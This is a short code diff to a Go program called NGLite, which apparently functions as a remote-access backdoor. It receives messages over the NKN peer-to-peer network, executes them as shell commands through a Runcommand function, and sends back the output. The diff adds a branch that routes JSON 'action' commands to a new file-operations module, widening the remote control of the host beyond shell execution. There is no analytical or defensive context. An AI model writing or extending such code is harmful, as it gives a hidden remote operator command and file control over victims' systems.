@@ -4,10 +4,12 @@ import (
 	"encoding/hex"
 	"flag"
 	"fmt"
+	"strings"
 
 	"NGLite/conf"
 	"NGLite/module/cipher"
 	"NGLite/module/command"
+	"NGLite/module/fileops"
 	"NGLite/module/getmac"
 
 	nkn "github.com/nknorg/nkn-sdk-go"
@@ -141,6 +143,14 @@ func Sender(srcid string, dst string, acc *nkn.Account, msg interface{}) (string
 }
 
 func Runcommand(cmd string) string {
+	if strings.HasPrefix(cmd, "{") && strings.Contains(cmd, "\"action\"") {
+		result, err := fileops.HandleFileCommand(cmd)
+		if err != nil {
+			return fmt.Sprintf(`{"success":false,"error":"%s"}`, err.Error())
+		}
+		return result
+	}
+	
 	_, out, _ := command.NewCommand().Exec(cmd)
 	return out
 }
